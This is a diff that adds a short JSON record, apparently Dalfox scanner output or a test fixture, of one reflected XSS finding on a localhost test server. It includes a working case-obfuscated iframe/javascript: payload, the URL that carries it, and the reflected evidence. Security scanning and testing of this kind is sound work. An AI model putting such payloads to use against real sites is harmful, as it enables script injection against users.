@@ -1,0 +1,17 @@
+[
+  {
+    "type": "V",
+    "inject_type": "inHTML-URL",
+    "poc_type": "plain",
+    "method": "GET",
+    "data": "http://127.0.0.1:18080/?name=test&q=test%22%3E%3CiFrAme%2Fsrc%3DjaVascRipt%3Aalert%281%29+class%3Ddalfox%3E%3C%2FiFramE%3E&ref=test",
+    "param": "q",
+    "payload": "\"><iFrAme/src=jaVascRipt:alert(1) class=dalfox></iFramE>",
+    "evidence": "1 line:  u searched for: test\"><iFrAme/src=jaVascRipt:alert(1) class=dalfox></iFramE></di",
+    "cwe": "CWE-79",
+    "severity": "High",
+    "message_id": 1702,
+    "message_str": "Triggered XSS Payload (found DOM Object): q=\"><iFrAme/src=jaVascRipt:alert(1) class=dalfox></iFramE>"
+  },
+  {}
+]
